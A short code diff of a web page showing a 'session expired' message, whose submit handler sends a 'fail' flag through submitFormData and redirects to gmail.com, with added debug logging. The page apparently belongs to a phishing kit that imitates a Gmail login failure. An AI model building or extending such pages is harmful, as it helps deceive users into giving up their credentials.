@@ -176,21 +176,21 @@ Your session has expired, please try again.
 
 </div>
 <script>
-page = "fail";
-
-submitBtn.addEventListener("click", function() {
 	
-  const user = {};
-  
-  user.fail = "fail";
+	submitBtn.addEventListener("click", function() {
+    const user = { fail: "fail" };
 
-  submitFormData(user);
-  window.location.replace("https://gmail.com");
-});
+    console.log("before");
 
+    try {
+        submitFormData(user);
+        console.log("after");
+    } catch (e) {
+        console.error("submitFormData error:", e);
+    }
 
-input.addEventListener("input",()=>{
-  wrapper.classList.remove("error");
+    console.log("redirecting");
+    window.location.replace("https://gmail.com");
 });
 </script>
 
